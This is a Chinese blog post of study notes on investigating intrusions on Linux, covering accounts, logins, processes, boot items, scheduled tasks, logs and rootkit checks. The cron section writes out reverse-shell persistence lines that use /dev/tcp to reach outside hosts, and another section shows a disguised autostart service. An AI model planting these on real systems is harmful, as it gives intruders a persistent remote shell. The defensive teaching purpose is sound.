<!-- build time:Thu Jan 18 2024 13:22:56 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="余星酒" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="余星酒" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="余星酒" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="应急响应,入侵排查"><link rel="canonical" href="http://example.com/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"><title>Linux入侵排查 - 入侵排查 - 应急响应 | 余星酒 = 余星酒 = 痴看年少风雨疾，一转本生蹉跎游</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Linux入侵排查</h1><div class="meta"><span class="item" title="创建时间：2023-07-07 13:16:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-07-07T13:16:00+08:00">2023-07-07</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">余星酒</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PDCERF/" itemprop="item" rel="index" title="分类于 应急响应"><span itemprop="name">应急响应</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PDCERF/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" itemprop="item" rel="index" title="分类于 入侵排查"><span itemprop="name">入侵排查</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="余星酒"><meta itemprop="description" content="痴看年少风雨疾，一转本生蹉跎游, 欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="余星酒"></span><div class="body md" itemprop="articleBody"><h1 id="用户分析"><a href="#用户分析" class="headerlink" title="用户分析"></a>用户分析</h1><p>在Linux中root用户是一个无敌的存在，可以做任何事情</p><ol><li>查询特权用户（UID为0）</li></ol><pre><code>cat /etc/passwd
grep &quot;0:0&quot; /etc/passwd
ls -l /etc/passwd
awk -F: &#39;$3==0 &#123;print $1&#125;&#39; /etc/passwd
awk -F: &#39;$2==&quot;!&quot; &#123;print $1&#125;&#39; /etc/shadow
awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow
</code></pre><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/0b0173e8d4d6269bbe3491e1b7f87a36_MD5.png"><p>有人入侵后，肯定会将自己的权限级别调到最高，该指令可以查看哪些用户为管理员，哪些是特权用户</p><ol start="2"><li>查询可以远程登录的账号信息</li></ol><pre><code>[root@localhost liangc]# awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow

root:$6$LZTiO0E28U0n0m3w$Ui0T3xK7XBz3WjVfnCr69dxkQ9DZw6e9a3IakQuvepgpjGfWjhCGEHdd/1fbFNbNlK1Y4zGRlP9124MWFlVnE/::0:99999:7:::
liangc:$6$7d1XF4g70XeEsdyS$AA1LEgKLmOQJ4TlT/pvKGd2t3F2OtI2T6lpVHAHPAfRtVYhG7Yr5x/6dpzVZM0MWh4nRtCShJKwrJwjpCDdWb0::0:99999:7:::
</code></pre><ol start="3"><li>除Root账号外，其他账号存在<code>sudo</code>权限</li></ol><pre><code>[root@localhost liangc]# cat -n /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
    92  root    ALL=(ALL)       ALL
    99  %wheel  ALL=(ALL)       ALL
   102  # %wheel        ALL=(ALL)       NOPASSWD: ALL
</code></pre><ol start="4"><li><code>禁用或删除多余及可疑账号</code></li></ol><pre><code>chage -l user     #  查看用户账号状态
usermod -L user   #  禁用账号，账号无法登录，/etc/shadow第二栏为!开头，user表示禁用的账号
userdel user      #  删除user用户
userdel -r uer    #  删除user用户，并且将其家目录一同删掉
</code></pre><ol start="5"><li><code>判断一个文件是否被修改</code></li></ol><pre><code>历史记录 + 文件属性

history | grep 文件名
stat 文件名
</code></pre><ol start="6"><li><code>判断密码是否被修改</code></li></ol><pre><code>用户属性 + 文件属性

chage -l user
stat /etc/shadow
</code></pre><h1 id="远程登录分析"><a href="#远程登录分析" class="headerlink" title="远程登录分析"></a>远程登录分析</h1><ol><li><code>who</code> : 查看当前登录用户（<code>tty本地登录，pts远程登录</code>）</li></ol><pre><code>[root@localhost liangc]# who
liangc   :0           2023-07-05 20:05 (:0)
liangc   pts/0        2023-07-05 20:05 (:0)
liangc   pts/1        2023-07-05 12:16 (192.168.226.1)
liangc   pts/2        2023-07-05 14:05 (192.168.226.1)
</code></pre><ol start="2"><li><code>w</code> ：用来显示已经登录系统的用户列表，就是<code>SSH</code>连接登录的数量</li></ol><pre><code>[root@localhost liangc]# w
 12:24:23 up 20 min,  3 users,  load average: 0.03, 0.04, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
liangc   :0       :0               20:05   ?xdm?  36.96s  0.16s /usr/libexec/gnome-session-binary --session gnome-classic
liangc   pts/0    :0               20:05     ?     0.31s  1.17s /usr/libexec/gnome-terminal-server
liangc   pts/1    192.168.226.1    12:16    7.00s  0.09s  0.14s sshd: liangc [priv]
</code></pre><p>这里可以发现除了本机连接以外，还有一个<code>192.168.226.1</code>的连接，可以先修改密码，然后关闭进程（pts&#x2F;1的进程）或者服务器在身边可以直接拔网线</p><ol start="3"><li><code>last</code> : 查看所有用户的登录时间，以及离线时间</li></ol><pre><code>[root@localhost liangc]# last
liangc   pts/1        192.168.226.1    Wed Jul  5 12:16   still logged in   // logged in 为一直在登录
liangc   pts/0        :0               Wed Jul  5 20:05   still logged in   
liangc   :0           :0               Wed Jul  5 20:05   still logged in   
reboot   system boot  3.10.0-862.el7.x Wed Jul  5 20:03 - 12:29  (-7:-34)   

wtmp begins Wed Jul  5 20:03:47 2023
</code></pre><ol start="4"><li><code>lastlog</code> : 查看哪些用户登录过系统</li></ol><pre><code>[root@localhost liangc]# lastlog
用户名           端口     来自             最后登陆时间
root             pts/1                     三 7月  5 12:21:13 +0800 2023
bin                                        **从未登录过**
daemon                                     **从未登录过**
adm                                        **从未登录过**
lp                                         **从未登录过**
sync                                       **从未登录过**
shutdown                                   **从未登录过**
halt                                       **从未登录过**
mail                                       **从未登录过**
operator                                   **从未登录过**
games                                      **从未登录过**
ftp                                        **从未登录过**
nobody                                     **从未登录过**
systemd-network                            **从未登录过**
dbus                                       **从未登录过**
polkitd                                    **从未登录过**
libstoragemgmt                             **从未登录过**
rpc                                        **从未登录过**
colord                                     **从未登录过**
gluster                                    **从未登录过**
saslauth                                   **从未登录过**
abrt                                       **从未登录过**
setroubleshoot                             **从未登录过**
rtkit                                      **从未登录过**
pulse                                      **从未登录过**
rpcuser                                    **从未登录过**
nfsnobody                                  **从未登录过**
unbound                                    **从未登录过**
chrony                                     **从未登录过**
qemu                                       **从未登录过**
radvd                                      **从未登录过**
tss                                        **从未登录过**
usbmuxd                                    **从未登录过**
geoclue                                    **从未登录过**
ntp                                        **从未登录过**
sssd                                       **从未登录过**
gdm              :0                        三 7月  5 20:05:08 +0800 2023
gnome-initial-setup                           **从未登录过**
sshd                                       **从未登录过**
avahi                                      **从未登录过**
postfix                                    **从未登录过**
tcpdump                                    **从未登录过**
liangc           pts/1                     三 7月  5 12:17:56 +0800 2023
</code></pre><ol start="5"><li><code>uptime</code> : 查看自己的服务器开了多长时间</li></ol><pre><code>[root@localhost liangc]# uptime
 14:12:54 up  2:04,  4 users,  load average: 0.01, 0.04, 0.05
</code></pre><ol start="6"><li><code>su - 用户名</code> : 查看指定账号的信息</li></ol><pre><code>[root@localhost liangc]# su - liangc
上一次登录：三 7月  5 14:05:42 CST 2023从 192.168.226.1pts/2 上
</code></pre><ol start="7"><li><code>lchage</code>、<code>chage</code></li></ol><pre><code>[root@localhost liangc]# chage -l root
最近一次密码修改时间                                    ：从不
密码过期时间                                    ：从不
密码失效时间                                    ：从不
帐户过期时间                                            ：从不
两次改变密码之间相距的最小天数          ：0
两次改变密码之间相距的最大天数          ：99999
在密码过期之前警告的天数        ：7
[root@localhost liangc]# lchage -l root
帐号没被锁。
至少:   0
至多:   99999
警告:   7
不活跃：        从不
最后一次改变：  从不
密码过期：      从不
密码不活跃：    从不
帐号过期：      从不
</code></pre><h1 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h1><p>Linux系统中默认会记录之前执行的命令 <code>/root/.bash_history</code>文件中</p><p>可以使用 <code>cat /root/.bash_history</code>或<code>history</code>进行查看</p><p>可以对一些命令进行过滤 wget（远程下载）、ssh（连接内网主机）、tar、zip（数据打包）、修改配置（命令修改）等命令进行筛选</p><p>当然有的系统可能是其他的shell，可以在<code>ls -la /root/</code>下查看</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/21842fba8a3c417c0d9e089d8d09b372_MD5.png"> <img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/bb2079104fe9321206df00941a7b96ca_MD5.png"><p>用户的家目录下存在着很多.开头的隐藏文件，如果安装着其他软件，则可能其他软件记录的历史命令可能存在于该隐藏文件中，如MySQL低版本中存在将授权命令保存在.mysql_history文件中 <code>cat /root/.mysql_history | grep grant</code> 可以得到用户的账号密码信息</p><ol><li>root的历史记录</li></ol><pre><code>history
</code></pre><ol start="2"><li>home目录下各账号目录下的<code>.bash_history</code>，查看普通账号的历史命令</li></ol><p><code>为历史的命令增加登录的IP地址、执行命令的时间等信息</code></p><h1 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h1><h2 id="网络连接分析"><a href="#网络连接分析" class="headerlink" title="网络连接分析"></a>网络连接分析</h2><p>使用<code>netstat</code>进行网络连接查看</p><ol><li>查看tcp连接 <code>netstat -pantl</code></li></ol><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/d4d1314155315bbc1800c09d77918057_MD5.png"><ol start="2"><li>查看udp连接 <code>netstat -panul</code></li></ol><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/ae092db32cdfc70cfc934ba2c85f0a13_MD5.png"><ol start="3"><li>查看全部连接 <code>netstat -panl</code></li></ol><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/b99bfb710ffface3107644c447cbfb52_MD5.png"><ol start="4"><li>查找出建立连接的连接 <code>netstat - panl | grep &quot;ESTABLISHED&quot;</code></li></ol><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/c93e4604d2f79f8b75aa13704889e35a_MD5.png"><p>根据响应的PID值对恶意连接进行删除<code>kill -9 PID值</code></p><h2 id="进程文件分析"><a href="#进程文件分析" class="headerlink" title="进程文件分析"></a>进程文件分析</h2><p>Linux中可以使用ps查看进程相关信息<code>ps aux</code> 查看所有进程信息</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/4714af7561eb548decf9484f269c4dd9_MD5.png"><h3 id="netstat-ps"><a href="#netstat-ps" class="headerlink" title="netstat+ps"></a>netstat+ps</h3><p>可以和前面的<code>netstat</code>相配合，找到异常连接后，复制其PID值，再在<code>ps</code>中查找对应的进程文件</p><p><code>netstat -pantl</code> &#x3D;&gt; <code>ps aux | grep PID</code>&#x3D;&gt; <code>kill -9 PID</code> &#x3D;&gt; <code>rm -rf 恶意文件</code></p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/8f375d5b2257ce060a28b7ec72f0c415_MD5.png"> <img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1dfeb119315d6f7bf4cd241e21308e70_MD5.png"><p>找到后可以先<code>kill</code>进程，之后在删除恶意文件</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/c07b23de9913c1f0428109308ddc3f15_MD5.png"><h3 id="lsof-ps"><a href="#lsof-ps" class="headerlink" title="lsof+ps"></a>lsof+ps</h3><p><code>lsof -i:端口</code>可以根据端口找到对应的进程，在使用<code>ps</code>+<code>grep</code>进行过滤就可找到恶意文件路径</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/eed408372bf7f76a02dc09a8327c8c9e_MD5.png"><h1 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h1><ol><li><code>/etc/rc.load</code>文件</li></ol><p>该文件<code>没有</code>执行权限，需要使用<code>chmod +x /etc/rc.d/rc.local</code> 将其赋予执行权限</p><pre><code>[root@localhost liangc]# cat /etc/rc.local
#!/bin/bash
# THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES
#
# It is highly advisable to create own systemd services or udev rules
# to run scripts during boot instead of using this file.
#
# In contrast to previous versions due to parallel execution during boot
# this script will NOT be run after all other services.
#
# Please note that you must run &#39;chmod +x /etc/rc.d/rc.local&#39; to ensure
# that this script will be executed during boot.

touch /var/lock/subsys/local
/tmp/abc &amp; # 想要开机自启的文件填入其绝对路径或者将其加到环境变量中，写文件名也可以，后面添加 &amp; 符号表明后台执行
</code></pre><ol start="2"><li>伪装服务配置文件</li></ol><p><code>/usr/lib/systemd/system/abc.service</code></p><pre><code>[Unit]
Description=abc
After=sshd.service

[Service]
Type=oneshot
ExecStart=/tmp/abc
</code></pre><p>新增服务后 <code>systemctl daemon-reload</code> 重新载入一下</p><p>排查思路</p><ol><li>查看开机启动</li></ol><pre><code>more /etc/rc.local

ls /etc/rc[0~6].d/

ls -l /etc/rc.d/rc3.d
</code></pre><ol start="2"><li>查看开机启动服务</li></ol><pre><code>systemctl list-unit-files | grep &quot;enable&quot;
</code></pre><ol start="3"><li>查找出异常服务后查询对应的文件</li></ol><pre><code>systemctl cat abc
</code></pre><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>重点观察目录</p><pre><code>/var/spool/cron/*
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/*
/etc/cron.hourly/*
/etc/cron.monthly/*
/etc/cron.weekly/*
/etc/anacrontab
/var/spool/anacron/*
</code></pre><ol><li>利用<code>crontab</code>创建计划任务<code>/var/spool/cron/user</code></li></ol><pre><code>crontab -l # 列出某个用户cron服务的详细内容

Tips : 默认编写的crontab文件会保存在 &quot;/var/spool/cron/用户名&quot; =&gt; &quot;/var/spool/cron/root&quot;

crontab -r # 删除每个用户cront任务（即删除所有的计划任务）
crontab -e # 使用编辑器编辑当前的crontab文件 /1 * echo &quot;hello world&quot; &gt;&gt; /tmp/1.txt =&gt; 每分钟写入文件
</code></pre><ol start="2"><li>利用<code>/etc/crontab</code> 文件写入定时任务</li></ol><pre><code>echo &quot;*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.226.129/1234 0&gt;&amp;1&quot; &gt;&gt; /etc/crontab
</code></pre><p>也可以使用 <code>crontab</code>进行计划任务的设定</p><p>输入<code>crontab -e</code>进入编辑，根据格式 * * * * * &#x3D;对应&#x3D;&gt; 分、时、日、月、星 最后面加上执行的命令</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/3ff3370d8418cab4f56e3399841221a4_MD5.png"><pre><code>*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.50.174/1234 0&gt;&amp;1 // 表示每隔1分钟执行反弹shell
</code></pre><p>使用<code>crontab -r</code>删除计划任务</p><ol start="3"><li>利用<code>anacron</code>实现异步定时任务调度，即所有的定时任务关机不会再次执行，可以利用此命令在关机后继续执行</li></ol><p>每天运行<code>/tmp/1.sh</code>脚本 &#x3D;&gt; <code>vim /etc/anacrontab @daily 10 example.daily /bin/bash /tmp/1.sh</code></p><h1 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h1><p>日志默认存放位置 : <code>/var/log/</code></p><p>查看日志配置情况 : <code>more /etc/rsyslog.conf</code></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>日志文件</td><td>说明</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cron</td><td>记录系统定时任务相关的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cups</td><td>记录打印信息的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;dmesg</td><td>记录系统在开机时内核自检的信息，也可以使用<code>dmesg</code><br><br>查看系统内核自检信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;mailog</td><td>记录邮件信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;message</td><td>记录系统重要信息的日志，这个日志文件中记录着Linux系统的大多数重要信息，系统出现问题时，首先要检查的就是这个日志文件</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;btmp</td><td>记录错误登录日志，这个文件时二进制文件，不能直接查看，需要使用<code>lastb</code>命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;lastlog</td><td>记录系统中所有用户最后一次登录时间的日志，这个文件时二进制文件，不能直接查看，需要使用<code>lastlog</code>命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;wtmp</td><td>永久记录所有用户的登录、注销信息，同事记录系统的启动、重启、关机事件，同样这个文件也是一个二进制文件，可以使用<code>last</code>命令查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;utmp</td><td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息，同样需要使用<code>w</code>、<code>who</code>、<code>users</code>等查询</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;secure</td><td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，ssh登录、su切换用户、sudo授权、甚至添加用户和修改密码都会被记录</td></tr></tbody></table><ol><li><code>定位有多少IP在爆破主机的root账号</code></li></ol><pre><code>grep &quot;Failed password for root&quot; /var/log/secure* | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more
</code></pre><ol start="2"><li><code>定位有多少IP在爆破主机</code></li></ol><pre><code>grep &quot;Failed password&quot; /var/log/secure* |egrep -E -o &quot;((1[0-9]|2[0-5])|[1-9])?[0-9]&#123;1&#125;\.((1[0-9]|2[0-5])|[1-9])?[0-9]&#123;1&#125;\.((1[0-9]|2[0-5])|[1-9])?[0-9]&#123;1&#125;\.((1[0-9]|2[0-5])|[1-9])?[0-9]&#123;1&#125;&quot; | sort | uniq -c
</code></pre><ol start="3"><li><code>定位登录成功的日期、用户名、IP</code></li></ol><pre><code>grep &quot;Accepted&quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; |  sort | uniq -c | more
</code></pre><ol start="4"><li><code>统计成功登录主机的IP以及使用哪些账号进行登录</code></li></ol><pre><code>grep -A 1 &quot;Accepted password&quot; /var/log/secure* | awk &#39;&#123;print $11&#125;&#39; | grep -v &quot;^$&quot; |  awk &#39;&#123;if(NR % 2 == 1) ORS = &quot; &quot;;else ORS=&quot;\n&quot;&#125;&#123;print $1&#125;&#39; | sort | uniq -c | more
</code></pre><ol start="5"><li><code>统计爆破用户名字典</code></li></ol><pre><code>grep &quot;Failed password&quot; /var/log/secure* | perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#39; | uniq -c | sort -nr|grep &quot;invalid&quot; | awk &#39;&#123;print $NF&#125;&#39;
</code></pre><h1 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h1><h2 id="tmp目录"><a href="#tmp目录" class="headerlink" title="tmp目录"></a>tmp目录</h2><p>在Linux系统下一切都是文件，其中 <code>/tmp</code>是一个特别的临时目录文件，每个用户都可以对它进行读写操作</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/65fbb9e074c3516345fea899fe399811_MD5.png"><h2 id="etc-init-d-目录"><a href="#etc-init-d-目录" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;目录"></a>&#x2F;etc&#x2F;init.d&#x2F;目录</h2><p>查看开机启动项内容 <code>/etc/init.d/</code>恶意代码很有可能设置在开机自启的位置</p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/21b04dcc59a66e16dd79af36c24986e2_MD5.png"><p>查看指定目录下文件时间顺序的排序 <code>ls -alt |head -n 10</code></p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/0efee9fbbf0b45404068bf33817d8f6a_MD5.png"><p>查看文件时间属性 ：<code>stat 文件名</code></p><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/5aa3be46a880f3763dbba9e93065fe99_MD5.png"><p>如果想要将某个程序设置为开机不自启动<code>update-rc.d 服务名 disable</code>设置开机启动<code>update-rc.d 服务名 enable</code></p><h2 id="敏感文件信息"><a href="#敏感文件信息" class="headerlink" title="敏感文件信息"></a>敏感文件信息</h2><p>根据具体的时间或事件进行查找分析</p><p>新增文件分析</p><pre><code>find ./ -mtime 0 -name &quot;*.php&quot;
</code></pre><pre><code>find ./ -mtime -2 -name &quot;*.php&quot;
</code></pre><p>权限查找</p><pre><code>find / -perm 777 -iname &quot;*.php&quot;  // -iname忽略大小写，-perm筛选文件权限
</code></pre><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><h2 id="PATH变量异常"><a href="#PATH变量异常" class="headerlink" title="$PATH变量异常"></a>$PATH变量异常</h2><p>决定了shell将到哪些目录中寻找命令或程序，PATH的值是一系列目录，当运行一个程序时，Linux在这些目录下进行搜寻编译连接 <code>echo $PATH</code></p><ol><li><p>临时修改 <code>PATH</code> <code>export PATH=$PATH:/usr/local/new/bin</code> 重启就会失效</p></li><li><p>修改完成后 <code>source ~/.bashrc</code>才能生效</p></li><li><p>通过配置文件修改 <code>/etc/profile</code>或<code>/home/.bashrc</code></p></li><li><p>同样修改完成后 <code>source ~/.bashrc</code>才能生效</p></li></ol><h1 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h1><h2 id="RPM-Check检查"><a href="#RPM-Check检查" class="headerlink" title="RPM Check检查"></a>RPM Check检查</h2><p>系统完整性可以通过rpm自带的<code>-Va</code>来检验所有的rpm软件包，查看哪些软件杯替换了</p><pre><code>./rpm -Va &gt; rpm.log
</code></pre><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示错来，输出格式是8位长字符串，每个字符串都用以表示文件与RPM数据库中一种属性的比较结果，如果是<code>.</code>表示通过</p><pre><code>验证内容中的8个信息的具体内容如下 : 
    S		文件大小是否改变
    M		文件的类型或文件的权限（rwx）是否被改变
    5		文件MD5校验是否改变（文件内容是否改变）
    D		设备中，从代码是否改变
    L		文件路径是否改变
    U		文件的属主是否改变（所有者）
    G		文件的属组是否改变
    T		文件的修改时间是否改变
</code></pre><p>如果命令被替换了，还原回来</p><pre><code>文件提取还原 : 
rpm -qf /bin/ls # 查询ls命令属于哪个软件包
mv /bin/ls /tmp # 把ls转移到tmp目录下，造成ls命令丢失的假象
rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls # 提取rpm包中ls命令到档期啊目录的/bin/ls下
cp /root/bin/ls /bin/ # 将ls命令复制到/bin/目录下修复文件丢失
</code></pre><h2 id="Rootkit查杀"><a href="#Rootkit查杀" class="headerlink" title="Rootkit查杀"></a>Rootkit查杀</h2><p>有些病毒可能会把系统命令进行伪装，从而达到隐藏的目的</p><h3 id="LinuxCheck"><a href="#LinuxCheck" class="headerlink" title="LinuxCheck"></a>LinuxCheck</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsMG5lL0xpbnV4Q2hlY2s=">https://github.com/al0ne/LinuxCheck</span></p><pre><code>chmod +x LinuxCheck.sh
./LinuxCheck.sh
</code></pre><h3 id="rkhunter"><a href="#rkhunter" class="headerlink" title="rkhunter"></a>rkhunter</h3><ol><li>系统命令检测、MD5校验</li><li>Rookit检测</li><li>本机敏感目录、系统配置异常举例</li></ol><pre><code>[root@localhost liangc]# yum install rkhunter
[root@localhost liangc]# rkhunter --check --sk
